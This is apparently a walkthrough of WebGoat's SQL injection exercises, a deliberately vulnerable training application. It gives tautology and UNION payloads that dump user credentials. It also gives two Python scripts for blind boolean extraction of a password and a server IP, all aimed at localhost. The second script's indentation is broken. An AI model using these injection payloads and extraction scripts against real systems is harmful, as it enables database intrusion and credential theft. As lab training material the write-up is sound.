# WebGoat Injection Flows
## SQL Injection (intro)
### Number 7
![Sql Injection n.7](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_01.png)

As you read in the previous part of this chapter we need to inject in the "Account Name" field something like this:
```
' or 1=1 --
```
The " ' " close the " ' " in the sql command, then we make a statement that is always true. This way all the entries of the database will be print. At the end we add -- to comment the rest of the Sql command, so if there are other request, they will commented.

### Number 8
![Sql Injection n.8](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_02.png)

As we read in this chapter we need to inject somthing like:
```
1 or 1=1 --
```
We need to pass a number because USERID is a number.

## SQL Injection (advanced)
### Number 3
![Sql Injection (Advanced) n.3](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_03.png)

To resolve this exercise you can read this documentation that is very good to learn how to implement a union injection.

First of all we need to find the number of columns of the table we are using. To do this we need to inject in the "Name" field:
```
' or 1=1 --
```
Now we can see the number and the type of columns.

![Sql Injection (Advanced) n.3 Number and Type of Columns](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_04.png)

With this information we can do a union with "user_system_data" table.

To make this union, we have to use the same number of columns and type.
```
' union select 0,user_name,password,'','','',0 from user_system_data --
```
And as we expected we achieve the solution.

![Sql Injection (Advanced) n.3 Solution](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_05.png)

### Number 5

![Sql Injection (Advanced) n.5](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_06.png)

First we try to register the username tom, but already exist. we try to register: ```tom' or 1=1```, but already exist also this.

So we try to register something like: ```Ale' or 1=1```, but it as no succes, so we try Ale and it doesn't exist so we noticed that the backend execute somthing like select <name> and if it exist it can't be registered. So now we can bruteforce to retrive the password of tom by doing a script in python that tray with "like" the password so the backend will try select username=tom and password like a%, where the "a" could be the firt letter and so on.
```
from string import *
import requests
from random import *
s = requests.Session()

alphabet = ascii_lowercase + ascii_uppercase + digits

user = ''.join(choice(alphabet) for i in range(12))
passwd = '123456789'

url = 'http://localhost:8080/WebGoat/register.mvc'
s.post(url, params={'username': user, 'password': passwd, 'matchingPassword': passwd, 'agree': 'agree'})


url = 'http://localhost:8080/WebGoat/SqlInjection/challenge'

tom_password = '%'

while True:
    counter = 1
    for char in alphabet:
        test = tom_password.replace("%", char + "%")
        parameters = {'username_reg': "tom' and password like '%s" % test, 'email_reg': 'tom@gmail.com', 'password_reg': 'tom', 'confirm_password_reg': 'tom'}
        print(test)
        response = s.put(url, params=parameters)
        counter += 1
        text = response.text
        if "already exists" in text:
            tom_password = test
            break

    if len(alphabet) < counter:
        break

print("password: " + tom_password)
```
We also can do a manual search by typing: "tom' and password like 't%"

We have to run this script with Python3 then when it finish we delete the last "%" and we get the password for tom (thisisasecretfortomonly). (There is a bug that don't make turn green the block 5)

## SQL Injection (mitigation)
### Number 8
![Sql Injection (Mitigation) n.8](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/01_07.png)

After some test we found that if we ask to order by ip, in the address path we have the state "column". We can use this to do samthing like this: " case (True) then … else … end ".

And instead of "(True)" we use "exists()".

So we pass to the exists function the select for the ip of the webgoat-prd and we compare every character with a number. If the result is ordered by ip we know that the number we use is true, while it will be ordered by mac address if it is not true.

We can use python to retrieve this solution with this script:
```
from string import *
import requests
from random import *
s = requests.Session()
alphabet = ascii_lowercase + ascii_uppercase
user = ''.join(choice(alphabet) for i in range(12))
passwd = '123456789'
url = 'http://localhost:8080/WebGoat/register.mvc'
s.post(url, params={'username': user, 'password': passwd, 'matchingPassword': passwd, 'agree': 'agree'})
alphabet = digits + "."
for i in range(1,15):
for n in alphabet:
        
        url = "http://localhost:8080/WebGoat/SqlInjection/servers?column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substr(ip,%s,1) = '%s') IS NOT NULL THEN hostname ELSE id END)" % (i, n)
        resp = s.get(url)
print("{}, {}: {}".format(i, n, resp.text))
print("-----------------------------------------------------------")
```
The ip of webgoat-prd is ```104.130.219.202```.
You can also use ZAP Fazzer, and doing the same thing.
